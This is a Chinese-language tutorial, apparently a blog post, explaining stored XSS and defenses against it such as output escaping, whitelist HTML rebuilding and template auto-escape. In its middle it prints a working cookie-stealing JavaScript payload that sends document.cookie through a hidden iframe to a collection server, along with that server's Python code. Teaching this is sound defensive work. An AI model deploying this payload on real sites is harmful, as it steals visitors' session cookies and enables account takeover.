### 一、XSS跨站攻击
XSS 全称“跨站脚本”，是注入攻击的一种。其特点是**`不对服务器端造成任何伤害`**，而是通过一些正常的站内交互途径，例如:  发布评论，提交含有JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。

运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口： 
```
while (true) {
    alert("我叫大雄，大家好~");
}
```
也可以是盗号或者其他未授权的操作。
我们来模拟一下这个过程，先建立一个用来收集信息的服务器：  
```
#!/usr/bin/env python
#-*- coding:utf-8 -*-

#  跨站脚本注入的信息收集服务器

import bottle
app = bottle.Bottle()
plugin = bottle.ext.sqlite.Plugin(dbfile='/var/db/myxss.sqlite')
app.install(plugin)
@app.route('/myxss/')
def show(cookies, db):
    SQL = 'INSERT INTO "myxss" ("cookies") VALUES (?)'
    try:
        db.execute(SQL, cookies)
    except:
        pass
    return ""
if __name__ == "__main__":
    app.run()
```
然后在某一个页面的评论中注入这段代码：
```
// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```
于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。

我们知道 AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范 XSS，多多少少都起了一些作用，但不是总是有用。  
正如上面的注入代码，用 iframe 也一样可以达到相同的目的。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。  
但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以**`防止 XSS 的根本之道还是过滤用户输入`**。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。
### 二、如何防范
* 如果我们不需要用户输入 HTML 而只想让他们输入纯文本，那么把所有用户输入进行 HTML **`转义输出`**。
* 若要允许用户输入 HTML，又要过滤其中的脚本。Tidy 等 HTML 清理库可以帮忙，但前提是我们小心地使用。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。对于复杂的情况，建议使用简单的方法处理，就是**`白名单重新整理`**。

用户输入的 HTML 可能拥有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML 要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失。  
如果用户的某种复杂输入不能为解析器所识别（前面说了 HTML 不同于 XML，要求有很强的容错性），那么它不会成为漏网之鱼，因为白名单重新整理的策略会直接丢弃掉这些未能识别的部分。最后获得的新 HTML 元素树，我们可以拍胸脯保证——所有的标签、属性都来自白名单，一定不会遗漏。
### 三、总结
现在看来，大多数 Web 开发者都了解 XSS 并知道如何防范，往往大型的 XSS 攻击（包括前段时间新浪微博的 XSS 注入）都是由于疏漏。建议在使用模版引擎的 Web 项目中，开启（或不要关闭）类似 Django Template、Jinja2 中“默认转义”（Auto Escape）的功能。在不需要转义的场合，我们可以用类似的方式取消转义。这种白名单式的做法，有助于降低我们由于疏漏留下 XSS 漏洞的风险。

另外一个风险集中区域，是富 AJAX 类应用（例如豆瓣网的阿尔法城）。这类应用的风险并不集中在 HTTP 的静态响应内容，所以不是开启模版自动转义能就能一劳永逸的。再加上这类应用往往需要跨域，开发者不得不自己打开危险的大门。这种情况下，站点的安全非常依赖开发者的细心和**`应用上线前有效的测试`**。  
现在亦有不少开源的 XSS 漏洞测试软件包。
不管怎么说，**`从用户输入的地方把好关总是成本最低而又最有效的做法`**。
#### 相关链接
<a href="https://www.cnblogs.com/wangyuyu/p/3388180.html" target="_blank">XSS跨站攻击</a>  

